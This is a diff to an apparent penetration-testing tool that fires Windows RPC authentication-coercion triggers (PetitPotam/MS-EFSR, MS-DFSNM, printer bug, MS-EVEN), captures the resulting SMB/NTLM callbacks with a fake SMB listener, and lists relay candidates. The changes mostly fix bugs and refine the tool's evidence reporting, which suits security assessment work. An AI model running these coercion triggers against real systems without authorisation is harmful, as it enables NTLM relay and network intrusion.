@@ -92,6 +92,9 @@ try:
         RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
         DCERPCException,
     )
+    # Impacket looks for this name in the request's module when a call returns
+    # an error. Keeping it here preserves the real Windows/RPC error text.
+    from impacket.dcerpc.v5.rrp import DCERPCSessionError
     from impacket.dcerpc.v5 import mgmt
     from impacket.uuid import (uuidtup_to_bin, bin_to_uuidtup, string_to_bin,
                                bin_to_string)
@@ -536,10 +539,32 @@ def _fire_rprn_legacy(dce, unc, host):
 def _fire_mseven(dce, unc, host):
     req = even.ElfrOpenBELW()
     req['UNCServerName'] = NULL
-    req['BackupFileName'] = '\\??\\UNC\\' + unc.lstrip('\\') + '\x00'
+    # This is a counted Unicode string, not a null-terminated WSTR. Including
+    # the null in its length makes Windows reject it with INVALID_PARAMETER.
+    req['BackupFileName'] = '\\??\\UNC\\' + unc.lstrip('\\')
     req['MajorVersion'] = 1
     req['MinorVersion'] = 1
     dce.request(req)
+
+
+# Impacket derives response-class names from each request class. These calls
+# need their status, not their output arguments, so empty response bodies are
+# sufficient. Without these classes the request fires and response handling
+# then crashes with a misleading missing-attribute error.
+for _request_class in (
+        _EfsRpcOpenFileRaw, _EfsRpcEncryptFileSrv, _EfsRpcDecryptFileSrv,
+        _EfsRpcQueryUsersOnFile, _EfsRpcQueryRecoveryAgents,
+        _EfsRpcRemoveUsersFromFile, _EfsRpcAddUsersToFile,
+        _EfsRpcFileKeyInfo, _EfsRpcDuplicateEncryptionInfoFile,
+        _EfsRpcAddUsersToFileEx, _NetrDfsAddStdRoot, _NetrDfsRemoveStdRoot,
+        _NetrDfsManagerInitialize, _NetrDfsAddStdRootForced,
+        _NetrDfsAddRootTarget, _NetrDfsRemoveRootTarget,
+        _IsPathSupported, _IsPathShadowCopied,
+        _RpcRemoteFindFirstPrinterChangeNotification):
+    _response_name = _request_class.__name__ + 'Response'
+    globals()[_response_name] = type(
+        _response_name, (NDRCALL,),
+        {'structure': (), '__module__': __name__})
 
 
 # interface_uuid (lowercase) -> coercion descriptor
@@ -559,6 +584,9 @@ COERCION_DB = {
     '4fc742e0-4a10-11cf-8273-00aa004ae673': {
         'label': 'MS-DFSNM',
         'uuidtup': ('4fc742e0-4a10-11cf-8273-00aa004ae673', '3.0'),
+        # NetExec uses Impacket's default RPC authentication level for DFSNM.
+        # Forcing packet privacy can fail the bind with auth error 0x8.
+        'auth_level': RPC_C_AUTHN_LEVEL_NONE,
         'pipes': ['netdfs'],
         'triggers': [
             ('NetrDfsAddStdRoot', 'ServerName', _fire_dfs_addstdroot),
@@ -606,6 +634,15 @@ RPRN_UUID = '12345678-1234-abcd-ef00-0123456789ab'
 
 # Short, user-facing explanations. Raw function names remain available through
 # --show-all instead of making the normal result read like developer output.
+# These methods accept only a server name, not a share/file path. They cannot
+# carry the per-attempt path tag, so source-and-timing evidence stays unconfirmed.
+_SERVER_ONLY_METHODS = {
+    'RpcRemoteFindFirstPrinterChangeNotificationEx',
+    'RpcRemoteFindFirstPrinterChangeNotification',
+    'NetrDfsAddStdRoot', 'NetrDfsRemoveStdRoot',
+    'NetrDfsManagerInitialize', 'NetrDfsAddStdRootForced',
+}
+
 _COERCION_INFO = {
     'c681d488-d850-11d0-8c52-00c04fd90f7e': (
         'File encryption service (PetitPotam)',
@@ -1486,12 +1523,14 @@ class CallbackListener(object):
         return identity or 'not present', host or None, cls._mic_from_type3(auth)
 
     def _smb_handle(self, conn, attempt_id, connection_id):
-        self._note(attempt_id, connection_id, protocol='SMB')
+        self._note(attempt_id, connection_id, protocol='SMB',
+                   stage='initial connection')
         session_id = 0
         for _ in range(12):
             req = self._smb_parse(self._recv_packet(conn))
             body = req['body']
             if req['command'] == 0:  # NEGOTIATE
+                self._note(attempt_id, connection_id, stage='SMB negotiate')
                 if req.get('smb1_negotiate'):
                     dialect = 0x0302
                 else:
@@ -1509,12 +1548,16 @@ class CallbackListener(object):
                     TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'],
                     TypesMech['MS KRB5 - Microsoft Kerberos 5']]
                 blob = init.getData()
+                # Do not advertise signing: this lightweight observer does not
+                # derive session keys or sign packets. Signing-required clients
+                # are unsupported; signing-capable clients can continue unsigned.
                 response = struct.pack(
-                    '<HHHH16sIIIIQQHH', 65, 1, dialect, 0,
+                    '<HHHH16sIIIIQQHH', 65, 0, dialect, 0,
                     uuid.uuid4().bytes, 0, 65536, 65536, 65536,
                     0, 0, 128, len(blob)) + blob
                 self._smb_send(conn, req, 0, 0, response)
             elif req['command'] == 1:  # SESSION_SETUP
+                self._note(attempt_id, connection_id, stage='SMB authentication')
                 if len(body) < 16:
                     return
                 off, length = struct.unpack_from('<HH', body, 12)
@@ -1552,6 +1595,7 @@ class CallbackListener(object):
                                auth='SPNEGO/other authentication')
                     return
             elif req['command'] == 3:  # TREE_CONNECT; auth was accepted for evidence
+                self._note(attempt_id, connection_id, stage='SMB share access')
                 if len(body) >= 8:
                     off, length = struct.unpack_from('<HH', body, 4)
                     packet = self._smb_header(req, 3, 0, session_id) + body
@@ -1639,19 +1683,27 @@ class CallbackListener(object):
                 pass
 
 
-def _evidence_summary(evidence):
+def _evidence_summary(evidence, tag_possible=True):
     """One short evidence line; never implies a verified identity."""
     if not evidence or not evidence.get('connection'):
         return 'No callback was observed.'
     parts = ['%s connection received' % (evidence.get('protocol') or 'TCP')]
     if evidence.get('auth'):
         parts.append('%s authentication observed' % evidence['auth'])
+    else:
+        parts.append('authentication not observed')
+        if evidence.get('stage'):
+            parts.append('last step: %s' % evidence['stage'])
     if evidence.get('identity'):
         parts.append('client claims to be %s' % evidence['identity'])
     if evidence.get('mic') in ('present', 'absent'):
         parts.append('message integrity code %s' % evidence['mic'])
-    if evidence.get('correlation') == 'path-tag':
+    if not tag_possible:
+        parts.append('path tag not applicable to this method')
+    elif evidence.get('correlation') == 'path-tag':
         parts.append('unique attempt tag matched')
+    elif not evidence.get('path'):
+        parts.append('callback path not observed; unique tag could not be checked')
     elif evidence.get('correlation'):
         parts.append('unique attempt tag not observed')
     return '; '.join(parts) + '.'
@@ -1762,9 +1814,11 @@ class RPCAuthMap(object):
             elif stage == 'smbsign':
                 action = 'Could not determine whether SMB signing is required.'
             elif stage.startswith('coerce-bind'):
-                action = 'Could not connect for this coercion test.'
+                action = '%s: could not connect for this coercion test.' % (
+                    stage.split(' ', 1)[1] if ' ' in stage else 'Coercion test')
             elif stage.startswith('coerce-fire'):
-                action = 'The coercion request returned an error.'
+                action = '%s: the coercion request returned an error.' % (
+                    stage.split(' ', 1)[1] if ' ' in stage else 'Coercion test')
             else:
                 action = 'A check failed.'
             with _print_lock:
@@ -1978,7 +2032,8 @@ class RPCAuthMap(object):
         try:
             dce = rpctransport.get_dce_rpc()
             dce.set_auth_type(RPC_C_AUTHN_WINNT)
-            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+            dce.set_auth_level(descriptor.get(
+                'auth_level', RPC_C_AUTHN_LEVEL_PKT_PRIVACY))
             dce.connect()
             dce.bind(uuidtup_to_bin(descriptor['uuidtup']))
         except Exception as e:
@@ -2051,6 +2106,7 @@ class RPCAuthMap(object):
         hits.append({
             'iface': descriptor['label'], 'pipe': transport_label,
             'method': method_name,
+            'tag_capable': method_name not in _SERVER_ONLY_METHODS,
             'confirmed': confirmed,
             'status': ('confirmed' if confirmed else
                        'callback' if untagged else status),
@@ -2291,7 +2347,7 @@ class RPCAuthMap(object):
                          'technical_label': desc['label'], 'methods': methods,
                          'how': explanation,
                          'auto': True, 'confirmed': None, 'attempted': False,
-                         'fail_reason': '', 'evidence': {}}
+                         'tag_possible': True, 'fail_reason': '', 'evidence': {}}
                 if self.do_coerce and not self.fuzz_dry_run:
                     entry['attempted'] = True
                     # Pass any TCP bindings from the endpoint mapper as
@@ -2300,6 +2356,8 @@ class RPCAuthMap(object):
                     tcp_bs = [b for b in bindings
                               if b.startswith('ncacn_ip_tcp')]
                     hits = self.coerce_probe(host, desc, tcp_bindings=tcp_bs)
+                    entry['tag_possible'] = any(
+                        h.get('tag_capable', True) for h in hits)
                     best = next((h for h in hits if h.get('confirmed')), None)
                     if best is None:
                         best = next((h for h in hits
@@ -2370,8 +2428,16 @@ class RPCAuthMap(object):
                     result_text = ('A callback with this attempt\'s unique tag was received.')
                 elif e['confirmed'] is False and evidence.get('connection'):
                     verdict = c('UNCONFIRMED', C.YELLOW)
-                    result_text = ('A connection was received, but it did not contain '
-                                   'this attempt\'s unique tag.')
+                    if not e.get('tag_possible', True):
+                        result_text = ('A connection followed the request. This method '
+                                       'accepts only a server name, so it cannot carry '
+                                       'the unique path tag.')
+                    elif not evidence.get('auth'):
+                        result_text = ('Only the initial connection was observed. '
+                                       'Authentication and the callback path were not received.')
+                    else:
+                        result_text = ('A connection was received, but it did not contain '
+                                       'this attempt\'s unique tag.')
                 elif e['confirmed'] is False:
                     verdict = c('UNCONFIRMED', C.YELLOW)
                     result_text = 'The request was sent, but no callback was received.'
@@ -2388,7 +2454,8 @@ class RPCAuthMap(object):
                                C.GREEN if e['confirmed'] is True else C.GREY))
                 if evidence:
                     lines.append(c('        Evidence: %s'
-                                   % _evidence_summary(evidence), C.CYAN))
+                                   % _evidence_summary(
+                                       evidence, e.get('tag_possible', True)), C.CYAN))
                     if evidence.get('identity'):
                         lines.append(c('        The reported identity comes from the client '
                                        'and is not independently verified.', C.GREY))
@@ -2408,19 +2475,28 @@ class RPCAuthMap(object):
         lines.append(c('  RELAY DESTINATION CHECKS', C.BOLD + C.CYAN))
         lines.append('     SMB signing: %s' % c(sign_txt, sign_col))
         if relay_viables:
-            lines.append(c('     RPC relay candidates: the supplied account made a basic '
-                           'connection to these services.', C.YELLOW))
-            lines.append(c('        Relayed access and permission to use each service '
-                           'were not tested.', C.GREY))
-            for r in relay_viables:
-                lines.append('     %s  %s' % (c('CANDIDATE', C.YELLOW),
-                                              c(r['label'], C.BOLD)))
-                lines.append(c('        Connection: %s.'
-                               % ('direct TCP' if not r['is_pipe'] else 'SMB named pipe'),
-                               C.GREY))
-                if self.show_all:
-                    lines.append(c('        Interface: %s' % r['uuid'], C.GREY))
-                    lines.append(c('        Binding: %s; authentication level: %s'
+            known_relays = [r for r in relay_viables
+                            if r['label'] != 'Unidentified Windows service']
+            unknown_count = len(relay_viables) - len(known_relays)
+            lines.append(c('     RPC relay candidates: %d %s accepted a basic '
+                           'connection from the supplied account.'
+                           % (len(relay_viables), 'service' if len(relay_viables) == 1
+                              else 'services'), C.YELLOW))
+            if known_relays:
+                lines.append(c('        Known services: %s.'
+                               % ', '.join(r['label'] for r in known_relays), C.GREY))
+            if unknown_count:
+                lines.append(c('        %d unidentified %s omitted. Use '
+                               '--show-all for identifiers.'
+                               % (unknown_count, 'service' if unknown_count == 1
+                                  else 'services'), C.GREY))
+            lines.append(c('        Relayed access and service permissions were not tested.',
+                           C.GREY))
+            if self.show_all:
+                for r in relay_viables:
+                    lines.append(c('        %s (%s)'
+                                   % (r['technical_label'], r['uuid']), C.GREY))
+                    lines.append(c('            %s; authentication level: %s'
                                    % (r['binding'], r['floor']), C.GREY))
         elif smb_signing is True:
             lines.append(c('     No RPC relay candidates found. SMB signing blocks '
@@ -2696,7 +2772,11 @@ def render_engagement_summary(results):
                     detail = 'unique callback tag matched'
                 elif e.get('confirmed') is False and evidence.get('connection'):
                     status = c('UNCONFIRMED', C.YELLOW)
-                    detail = 'callback did not match the attempt tag'
+                    detail = ('callback observed; this method cannot carry a path tag'
+                              if not e.get('tag_possible', True) else
+                              'only the initial connection was observed'
+                              if not evidence.get('auth') else
+                              'callback did not match the attempt tag')
                 elif e.get('confirmed') is False:
                     status = c('UNCONFIRMED', C.YELLOW)
                     detail = 'request sent; no callback received'
